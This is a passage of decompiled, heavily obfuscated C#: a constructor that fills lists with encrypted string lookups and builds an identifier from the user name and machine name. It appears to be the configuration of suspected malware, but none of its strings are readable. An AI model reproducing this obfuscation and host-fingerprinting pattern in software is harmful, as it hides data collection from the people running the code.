			IOVuiCuRiaYQ(getString_0(107456242)),
			IOVuiCuRiaYQ(getString_0(107456233)),
			IOVuiCuRiaYQ(getString_0(107456156)),
			IOVuiCuRiaYQ(getString_0(107456115)),
			IOVuiCuRiaYQ(getString_0(107456614)),
			IOVuiCuRiaYQ(getString_0(107456553)),
			IOVuiCuRiaYQ(getString_0(107456472)),
			IOVuiCuRiaYQ(getString_0(107456455)),
			IOVuiCuRiaYQ(getString_0(107456366)),
			IOVuiCuRiaYQ(getString_0(107455797)),
			IOVuiCuRiaYQ(getString_0(107455784)),
			IOVuiCuRiaYQ(getString_0(107455743)),
			IOVuiCuRiaYQ(getString_0(107455686)),
			IOVuiCuRiaYQ(getString_0(107462595)),
			IOVuiCuRiaYQ(getString_0(107456093)),
			IOVuiCuRiaYQ(getString_0(107456096)),
			IOVuiCuRiaYQ(getString_0(107456063)),
			IOVuiCuRiaYQ(getString_0(107455990)),
			IOVuiCuRiaYQ(getString_0(107455961)),
			IOVuiCuRiaYQ(getString_0(107462701)),
			IOVuiCuRiaYQ(getString_0(107455920)),
			IOVuiCuRiaYQ(getString_0(107455903)),
			IOVuiCuRiaYQ(getString_0(107455874)),
			IOVuiCuRiaYQ(getString_0(107460424)),
			IOVuiCuRiaYQ(getString_0(107455329)),
			IOVuiCuRiaYQ(getString_0(107455874)),
			IOVuiCuRiaYQ(getString_0(107455300)),
			IOVuiCuRiaYQ(getString_0(107455271)),
			IOVuiCuRiaYQ(getString_0(107455242)),
			IOVuiCuRiaYQ(getString_0(107455161)),
			IOVuiCuRiaYQ(getString_0(107455144)),
			IOVuiCuRiaYQ(getString_0(107455103)),
			IOVuiCuRiaYQ(getString_0(107455554)),
			IOVuiCuRiaYQ(getString_0(107455525)),
			IOVuiCuRiaYQ(getString_0(107455452)),
			IOVuiCuRiaYQ(getString_0(107455407)),
			IOVuiCuRiaYQ(getString_0(107455394)),
			IOVuiCuRiaYQ(getString_0(107455361)),
			IOVuiCuRiaYQ(getString_0(107454792)),
			IOVuiCuRiaYQ(getString_0(107454715)),
			IOVuiCuRiaYQ(getString_0(107454690)),
			IOVuiCuRiaYQ(getString_0(107454657)),
			IOVuiCuRiaYQ(getString_0(107454584)),
			IOVuiCuRiaYQ(getString_0(107455067)),
			IOVuiCuRiaYQ(getString_0(107455038)),
			IOVuiCuRiaYQ(getString_0(107454973)),
			IOVuiCuRiaYQ(getString_0(107454948)),
			IOVuiCuRiaYQ(getString_0(107454875)),
			IOVuiCuRiaYQ(getString_0(107454858)),
			IOVuiCuRiaYQ(getString_0(107454313)),
			IOVuiCuRiaYQ(getString_0(107454232)),
			IOVuiCuRiaYQ(getString_0(107454219)),
			IOVuiCuRiaYQ(getString_0(107454138)),
			IOVuiCuRiaYQ(getString_0(107454125)),
			IOVuiCuRiaYQ(getString_0(107454556)),
			IOVuiCuRiaYQ(getString_0(107454523)),
			IOVuiCuRiaYQ(getString_0(107454482)),
			IOVuiCuRiaYQ(getString_0(107454473)),
			IOVuiCuRiaYQ(getString_0(107454396)),
			IOVuiCuRiaYQ(getString_0(107457141)),
			IOVuiCuRiaYQ(getString_0(107454363)),
			IOVuiCuRiaYQ(getString_0(107454322)),
			IOVuiCuRiaYQ(getString_0(107453753)),
			IOVuiCuRiaYQ(getString_0(107453724)),
			IOVuiCuRiaYQ(getString_0(107453691)),
			IOVuiCuRiaYQ(getString_0(107453658)),
			IOVuiCuRiaYQ(getString_0(107453641)),
			IOVuiCuRiaYQ(getString_0(107453612)),
			IOVuiCuRiaYQ(getString_0(107453567)),
			IOVuiCuRiaYQ(getString_0(107454002)),
			IOVuiCuRiaYQ(getString_0(107453993)),
			IOVuiCuRiaYQ(getString_0(107453904)),
			IOVuiCuRiaYQ(getString_0(107453887)),
			IOVuiCuRiaYQ(getString_0(107453858)),
			IOVuiCuRiaYQ(getString_0(107453269))
		};
		kaTfzyzEKr = new List<string>
		{
			IOVuiCuRiaYQ(getString_0(107453260)),
			IOVuiCuRiaYQ(getString_0(107453179)),
			IOVuiCuRiaYQ(getString_0(107453162)),
			IOVuiCuRiaYQ(getString_0(107453081)),
			IOVuiCuRiaYQ(getString_0(107453064)),
			IOVuiCuRiaYQ(getString_0(107453511)),
			IOVuiCuRiaYQ(getString_0(107453402)),
			IOVuiCuRiaYQ(getString_0(107453341))
		};
		xJpBolVCtSaaMGl = new List<string>
		{
			IOVuiCuRiaYQ(getString_0(107453316)),
			IOVuiCuRiaYQ(getString_0(107452771)),
			IOVuiCuRiaYQ(getString_0(107452694)),
			IOVuiCuRiaYQ(getString_0(107452677)),
			IOVuiCuRiaYQ(getString_0(107452644)),
			IOVuiCuRiaYQ(getString_0(107452563)),
			IOVuiCuRiaYQ(getString_0(107452550)),
			IOVuiCuRiaYQ(getString_0(107453029)),
			IOVuiCuRiaYQ(getString_0(107452996)),
			IOVuiCuRiaYQ(getString_0(107452963)),
			IOVuiCuRiaYQ(getString_0(107452930)),
			IOVuiCuRiaYQ(getString_0(107452897)),
			IOVuiCuRiaYQ(getString_0(107452824)),
			IOVuiCuRiaYQ(getString_0(107452783)),
			IOVuiCuRiaYQ(getString_0(107452258)),
			IOVuiCuRiaYQ(getString_0(107452225)),
			IOVuiCuRiaYQ(getString_0(107452152)),
			IOVuiCuRiaYQ(getString_0(107452119)),
			IOVuiCuRiaYQ(getString_0(107452078)),
			IOVuiCuRiaYQ(getString_0(107452069)),
			IOVuiCuRiaYQ(getString_0(107452036)),
			IOVuiCuRiaYQ(getString_0(107452475)),
			IOVuiCuRiaYQ(getString_0(107452442)),
			IOVuiCuRiaYQ(getString_0(107453316)),
			IOVuiCuRiaYQ(getString_0(107452401)),
			IOVuiCuRiaYQ(getString_0(107452392)),
			IOVuiCuRiaYQ(getString_0(107452315)),
			IOVuiCuRiaYQ(getString_0(107452282)),
			IOVuiCuRiaYQ(getString_0(107451729)),
			IOVuiCuRiaYQ(getString_0(107451720)),
			IOVuiCuRiaYQ(getString_0(107451687)),
			IOVuiCuRiaYQ(getString_0(107451646)),
			IOVuiCuRiaYQ(getString_0(107451573)),
			IOVuiCuRiaYQ(getString_0(107452771)),
			IOVuiCuRiaYQ(getString_0(107451564)),
			IOVuiCuRiaYQ(getString_0(107452694)),
			IOVuiCuRiaYQ(getString_0(107451531)),
			IOVuiCuRiaYQ(getString_0(107452010)),
			IOVuiCuRiaYQ(getString_0(107451969)),
			IOVuiCuRiaYQ(getString_0(107451936)),
			IOVuiCuRiaYQ(getString_0(107451863)),
			IOVuiCuRiaYQ(getString_0(107451822)),
			IOVuiCuRiaYQ(getString_0(107451821)),
			IOVuiCuRiaYQ(getString_0(107451788)),
			IOVuiCuRiaYQ(getString_0(107451235)),
			IOVuiCuRiaYQ(getString_0(107451162)),
			IOVuiCuRiaYQ(getString_0(107451121))
		};
		qGtrUSLzRTTZGp = new List<string>
		{
			IOVuiCuRiaYQ(HoxnFARxQnHppaC(getString_0(107451112))),
			IOVuiCuRiaYQ(getString_0(107451031)),
			IOVuiCuRiaYQ(getString_0(107451450)),
			IOVuiCuRiaYQ(getString_0(107451353)),
			IOVuiCuRiaYQ(getString_0(107451260)),
			IOVuiCuRiaYQ(getString_0(107450651)),
			IOVuiCuRiaYQ(getString_0(107450590)),
			IOVuiCuRiaYQ(getString_0(107450973)),
			IOVuiCuRiaYQ(getString_0(107450912)),
			IOVuiCuRiaYQ(getString_0(107450815)),
			IOVuiCuRiaYQ(getString_0(107450210)),
			IOVuiCuRiaYQ(getString_0(107450113)),
			IOVuiCuRiaYQ(getString_0(107450020)),
			IOVuiCuRiaYQ(HoxnFARxQnHppaC(getString_0(107451112)))
		};
		aJeonqeZxZjBYP = IOVuiCuRiaYQ(getString_0(107450435));
		oaBCccgHDdJd = new List<string>
		{
			IOVuiCuRiaYQ(getString_0(107450290)),
			IOVuiCuRiaYQ(getString_0(107449584)),
			IOVuiCuRiaYQ(getString_0(107449902)),
			IOVuiCuRiaYQ(getString_0(107449740)),
			IOVuiCuRiaYQ(getString_0(107449034)),
			IOVuiCuRiaYQ(getString_0(107449352))
		};
		icaOPjdPYWz = new List<string>
		{
			IOVuiCuRiaYQ(getString_0(107448646)),
			IOVuiCuRiaYQ(getString_0(107448585)),
			IOVuiCuRiaYQ(getString_0(107448524))
		};
		oLvOfyvKUaGGbe = getString_0(107396257);
		ShLKXLWXgnFS = getString_0(107396257);
		lvLyzrSdZWTvl = new DateTime(2000, 1, 1);
		RIuOTMlEmkOFp = new DateTime(2100, 1, 1);
		KfMEqDPrRPT = getString_0(107396947);
		VwOPUhcZlsvZmR = getString_0(107365886);
		QswmepBqskCzQp = getString_0(107396257);
		uGJVwqqCaIgV = getString_0(107396257);
		eIhiYKKqjghql = getString_0(107396257);
		EyuqCsqyzUlFrC = getString_0(107396947);
		pQdBrLzHnnmlBCib = getString_0(107396257);
		UyFfCzWWLzNEG = getString_0(107396257);
		PlfqlzQrkBHY = new List<string>
		{
			getString_0(107391992),
			getString_0(107385057),
			getString_0(107412372),
			getString_0(107393011)
		};
		rLaVjFwRdfLdr = getString_0(107396257);
		KOFrqFvMUqLVa = getString_0(107395907);
		kNVvigmBlweOU = getString_0(107396257);
		MOygNsolRhkJe = getString_0(107396257);
		FEjtIQTdWPKq = getString_0(107396257);
		kRItCdOVRz = string.Empty;
		SthzOntllxfA = getString_0(107396257);
		LDgIudiIYnqCR = getString_0(107396947);
		NXYcsEtzzwISc = getString_0(107396947);
		WjafbRcVrLBYmq = getString_0(107448431);
		ZUKimkoDnnjTL = getString_0(107448878);
		OOevMgLQSWPS = getString_0(107396257);
		EXIQNiPOzZeVrr = getString_0(107396257);
		dwDJlZMjFatuJC = getString_0(107396257);
		iMyPpHoxcDvKb = getString_0(107396257);
		OJTbTYigtwhLK = getString_0(107396257);
		IVSJCyvJyoM = getString_0(107368463);
		FvUkwYzFpYssaXTTm = getString_0(107396257);
		PdtBHCoVfJFK = getString_0(107396257);
		wKJjmTiGCFwzP = getString_0(107447872);
		PxbeNSeofeL = getString_0(107396257);
		LrysOkAIBno = getString_0(107396257);
		ALuUYkUNFV = getString_0(107396947);
		SnUyxrzkfX = getString_0(107396257);
		DlqNAdVPvtac = getString_0(107447851);
		dIQesMrbLpRzZUQ = getString_0(107396947);
		RPSmcrMfZxWv = getString_0(107396947);
		IHwEnwKHmUDVbo = getString_0(107396257);
		MINjWBEgMCN = getString_0(107396257);
		HrrdtvrqUAxN = new string[0];
		ObdFXRKnttrKo = getString_0(107396947);
		geKzJTCQWBdPJrv = true;
		WcZSwKmwveRmr = getString_0(107396947);
		jHNjZakAkEHPd = true;
		XmcyFZznPVQg = false;
		QBgkrSBixAW = false;
		kqjAwtfZegDGvm = false;
		TVaVFXxrZtbC = getString_0(107447838);
		fKNptYRWsQNeZX = false;
		mHmqMmGdAKRlZCy = false;
		UBWmyKQOefd = false;
		eRHwMzVAUfqqx = false;
		ZKpCkvvrIixyBkk = true;
		MBSkjCFQIZSn = getString_0(107447817) + Environment.UserName + getString_0(107447772) + Environment.MachineName + getString_0(107447783) + FZYQuTJPlcz.bHHLhQTTINyhzg() + getString_0(107447778);
		IgsTsyCAVSNbiX = true;
		wuIBqNhSkYrbJgK = new Stopwatch();
		opDJfdSoJwBgd = 0;
		LHsTakbnvLMZqfZlb = 0;
		pWNBRDgBMEak = false;
		ACFERZKTAMdtw = getString_0(107447737) + FZYQuTJPlcz.bHHLhQTTINyhzg() + getString_0(107447728);
		CFiTuUySaVmkX = new string[1] { getString_0(107447755) };
		pCjGIjTYqWtfL = new List<string>();
		tZrxRwzECkVmv = 0;
	}
}
